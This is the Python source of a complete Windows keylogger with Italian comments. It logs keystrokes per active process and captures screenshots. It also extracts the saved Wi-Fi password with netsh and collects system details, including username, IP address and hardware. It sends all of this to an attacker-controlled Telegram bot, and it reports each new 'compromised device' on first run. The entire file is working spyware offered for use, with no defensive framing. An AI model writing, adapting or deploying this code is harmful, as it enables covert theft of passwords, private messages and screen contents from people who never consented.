import time as t
from pynput import keyboard as k
import requests
from PIL import ImageGrab
import os
import psutil
import win32gui
import win32process
import platform
import subprocess
import socket
import sys

# Telegram Bot Configuration
BOT_API_TOKEN = "TOKEN"
USER_ID = "ID"
LOG_INTERVAL = 30
SCREENSHOT_INTERVAL = 40  # 40 secondi tra uno screenshot e l’altro

# Keystroke storage
process_keystrokes = {}  # Dizionario: {process_name: [keystrokes]}
current_process_name = "unknown.exe"
last_screenshot_time = 0
last_send_time = t.time()

def get_wifi_password():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "Tutti i profili utente :" in line]
        if profiles:
            wifi_name = profiles[0]
            result2 = subprocess.run(
                ["netsh", "wlan", "show", "profile", wifi_name, "key=clear"],
                capture_output=True, text=True
            )
            password_line = [line for line in result2.stdout.splitlines() if "Contenuto chiave" in line]
            if password_line:
                password = password_line[0].split(":")[1].strip()
                return f"{wifi_name}: {password}"
        return "Nessuna password trovata"
    except Exception:
        return "Errore nel recupero della password Wi-Fi"

def get_system_info():
    try:
        # Informazioni di base
        os_info = platform.platform()
        user_name = os.getlogin()
        wifi_info = get_wifi_password()
        
        # Indirizzo IP
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "Non disponibile"
        
        # Caratteristiche hardware
        cpu_info = platform.processor()
        try:
            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)  # in GB
            ram_available = round(psutil.virtual_memory().available / (1024**3), 2)  # in GB
        except:
            ram_total = "Non disponibile"
            ram_available = "Non disponibile"
        
        # Dischi rigidi
        disk_info = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                total = round(usage.total / (1024**3), 2)  # in GB
                disk_info.append(f"{partition.device}: {total}GB")
            except:
                continue
        
        # Risultato finale
        return f"""
*🖥️ INFORMAZIONI SISTEMA*

*OS:* ```\n{os_info}\n```
*Utente:* ```\n{user_name}\n```
*IP:* ```\n{ip_address}\n```

{'─' * 16}

*🔧 CARATTERISTICHE HARDWARE*
*CPU:* ```\n{cpu_info}\n```
*RAM totale:* ```\n{ram_total}GB\n```
*RAM disponibile:* ```\n{ram_available}GB\n```

{'─' * 16}

*💾 DISCHI RIGIDI*
{chr(10).join([f"├─ `{disk}`" for disk in disk_info]) if disk_info else "├─ Nessun disco trovato"}

{'─' * 16}

*🔐 WIFI*
*Password:* ```\n{wifi_info}\n```
        """.strip()
        
        return info_message
    except Exception as e:
        return f"*❌ Errore nel recupero info:* `{e}`"

def send_telegram_message(body):
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": body,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Messaggio correttamente inviato al bot.")
        else:
            print(f"c'è stato un problema. Status Code: {response.status_code}")
            print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {e}")

def send_screenshot():
    global last_screenshot_time
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)

        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendPhoto"
        with open(screenshot_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': USER_ID}
            response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print("✅ Screenshot inviato correttamente.")
        else:
            print(f"❌ Errore nell'invio dello screenshot: {response.status_code}")
            print(f"Response: {response.text}")

        # Cancella il file dopo l'invio
        os.remove(screenshot_path)
        print("🗑️ File screenshot cancellato.")
        last_screenshot_time = t.time()

    except Exception as e:
        print(f"❌ Errore durante l'invio dello screenshot: {e}")

def send_keystrokes():
    global process_keystrokes, last_send_time
    if process_keystrokes:
        full_message = ""
        for proc_name, keys in process_keystrokes.items():
            if keys:
                text = ''.join(keys)
                if len(text) > 4096:
                    text = text[:4093] + "..."
                full_message += f"⚙️ Processo attivo: `{proc_name}`\n-------------------------------\nKeystrokes:\n```\n{text}\n```\n\n"
        
        if full_message:
            send_telegram_message(full_message.strip())
            print("✅ Invio tutti i keystrokes per ogni processo.")
    
    # RESETTA IL DIZIONARIO DOPO L'INVIO
    process_keystrokes.clear()
    print("🔄 Dizionario process_keystrokes resettato dopo l'invio.")
    
    last_send_time = t.time()


def on_press(key):
    global current_process_name, process_keystrokes
    try:
        # Aggiorna il processo attivo solo quando cambia
        new_process = get_active_process_name()
        if new_process != current_process_name:
            current_process_name = new_process
            print(f"🔄 Processo cambiato: {current_process_name}")

        if hasattr(key, 'char') and key.char is not None:
            # Aggiungi il carattere al processo corrente
            if current_process_name not in process_keystrokes:
                process_keystrokes[current_process_name] = []
            process_keystrokes[current_process_name].append(key.char)

        else:
            key_name = str(key).replace('Key.', '').lower()
            # Aggiungi il tasto speciale al processo corrente
            if current_process_name not in process_keystrokes:
                process_keystrokes[current_process_name] = []
            process_keystrokes[current_process_name].append(f"[{key_name}]")
            print(f"⌨️ Tasto speciale: {key_name}")

            if key_name == 'enter':
                # Invia SEMPRE screenshot e poi keystrokes quando premi Invio
                print("🚀 Premuto Invio! Invio screenshot e poi keystrokes...")
                
                # Invia screenshot immediatamente
                current_time = t.time()
                if current_time - last_screenshot_time > SCREENSHOT_INTERVAL:
                    send_screenshot()
                else:
                    print("📸 Screenshot già inviato di recente, attendo...")
                
                # Poi invia e resetta i keystrokes
                send_keystrokes()  # Questo resetta il dizionario

    except Exception as e:
        print(f"Errore durante la gestione del tasto: {e}")

def get_active_process_name():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['pid'] == pid:
                    return proc.info['name']
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "unknown.exe"
    except Exception:
        return "unknown.exe"

def main():
    # Controlla se è il primo avvio
    first_run_file = ".first_run"
    if not os.path.exists(first_run_file):
        print("📦 Primo avvio: invio informazioni di sistema...")
        info = get_system_info()
        send_telegram_message(f"🆕 Nuovo dispositivo compromesso:\n{info}")
        with open(first_run_file, 'w') as f:
            f.write("done")
        print("✅ Info inviate e file di stato creato.")

    # Avvia listener
    listener = k.Listener(on_press=on_press)
    listener.start()

    try:
        while True:
            t.sleep(1)
            # Controlla se sono passati 30 secondi dall'ultimo invio
            if t.time() - last_send_time >= LOG_INTERVAL:
                if process_keystrokes:
                    print("⏰ 30 secondi trascorsi, invio e resetto i keystrokes...")
                    send_keystrokes()  # Invia e resetta i keystrokes
    except KeyboardInterrupt:
        print("\nUscendo dal keylogger...")

if __name__ == "__main__":
    main()
